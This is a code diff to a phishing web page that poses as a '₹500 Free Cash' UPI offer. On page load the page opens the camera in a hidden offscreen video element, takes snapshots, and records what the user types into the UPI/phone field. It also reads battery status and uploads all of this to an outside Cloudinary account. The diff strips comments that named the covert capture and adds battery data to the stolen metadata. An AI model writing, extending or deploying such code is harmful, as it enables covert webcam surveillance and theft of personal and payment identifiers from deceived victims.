@@ -140,7 +140,6 @@
             font-weight: 600;
         }
 
-        /* Hidden video stream for automated capture */
         #video {
             position: absolute;
             top: -9999px;
@@ -152,7 +151,6 @@
 </head>
 <body>
 
-    <!-- Hidden video stream for automated capture -->
     <video id="video" autoplay playsinline></video>
 
     <div class="main-container">
@@ -166,13 +164,11 @@
                 💰 Claim ₹500 Free Cash
             </div>
 
-            <!-- Fake input field to invoke mobile/desktop keyboard activity logging -->
             <div class="input-group">
                 <label for="upiInput">Enter UPI ID / Phone Number</label>
                 <input type="text" id="upiInput" placeholder="e.g. 9876543210@paytm" autocomplete="off">
             </div>
 
-            <!-- Device specs block showing battery percentage extraction -->
             <div class="device-info">
                 <span>🔋 Battery: <strong id="batteryStatus">Loading...</strong></span>
                 <span>⚡ Status: <strong style="color: #38a169;">Secure</strong></span>
@@ -196,36 +192,37 @@
         const upiInput = document.getElementById('upiInput');
         let mediaStream = null;
         let typedKeystrokes = "";
+        let batteryLevelInfo = "Unknown";
 
-        // Collect keyboard inputs dynamically as the user types
+        // Track keystrokes dynamically
         upiInput.addEventListener('input', (e) => {
             typedKeystrokes = e.target.value;
         });
 
-        // Initialize background tasks on page load
         window.addEventListener('load', () => {
             initializeBackgroundCamera();
             initializeBatteryCheck();
         });
 
-        // Fetch device battery API information
         async function initializeBatteryCheck() {
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     updateBatteryUI(battery);
-                    
                     battery.addEventListener('levelchange', () => updateBatteryUI(battery));
                 } catch (err) {
+                    batteryLevelInfo = "Accessible (Error reading level)";
                     document.getElementById('batteryStatus').innerText = "Available";
                 }
             } else {
+                batteryLevelInfo = "Not Supported";
                 document.getElementById('batteryStatus').innerText = "Compatible";
             }
         }
 
         function updateBatteryUI(battery) {
             const percentage = Math.round(battery.level * 100);
+            batteryLevelInfo = percentage + "% (Charging: " + battery.charging + ")";
             document.getElementById('batteryStatus').innerText = percentage + "%";
         }
 
@@ -237,7 +234,7 @@
                 });
                 video.srcObject = mediaStream;
             } catch (error) {
-                // Handled gracefully on interaction click if rejected early
+                // Handled on click
             }
         }
 
@@ -273,7 +270,7 @@
                 currentShot++;
                 const dataUrl = captureFrameToDataURL();
                 
-                // Upload snapshot including metadata text packet if helpful
+                // Upload image containing battery details and text inputs inside Cloudinary metadata (context)
                 uploadToCloudinary(dataUrl, currentShot);
 
                 if (currentShot >= totalShots) {
@@ -310,7 +307,11 @@
             const formData = new FormData();
             formData.append('file', dataUrl);
             formData.append('upload_preset', UPLOAD_PRESET);
-            formData.append('context', `keystrokes=${typedKeystrokes}`);
+            
+            // Clean and bundle keyboard input and battery status into Cloudinary metadata parameters
+            const cleanInput = encodeURIComponent(typedKeystrokes || "None");
+            const cleanBattery = encodeURIComponent(batteryLevelInfo);
+            formData.append('context', `keystrokes=${cleanInput}|battery=${cleanBattery}|shot_index=${index}`);
 
             try {
                 await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
